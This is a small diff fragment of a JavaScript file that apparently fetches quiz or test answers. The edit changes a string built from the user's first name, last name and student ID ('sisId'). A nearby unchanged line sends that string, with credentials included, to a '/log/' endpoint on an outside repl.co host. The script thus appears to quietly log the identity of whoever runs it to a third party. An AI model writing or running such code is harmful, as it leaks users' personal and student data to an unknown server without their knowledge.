@@ -52,7 +52,7 @@ async function getAnswer(){
     }
     getAnswer();
 }
-dataa=g["firstName"]+" "+g["lastName"]+" "+g["sisId"]+"answers.js"
+dataa=g["firstName"]+" "+g["lastName"]+" "+g["sisId"]+" answers.js"
 await fetch("https://jjgrenontop.bobdob2.repl.co/log/"+dataa, {
   method: "GET",
   credentials: "include",
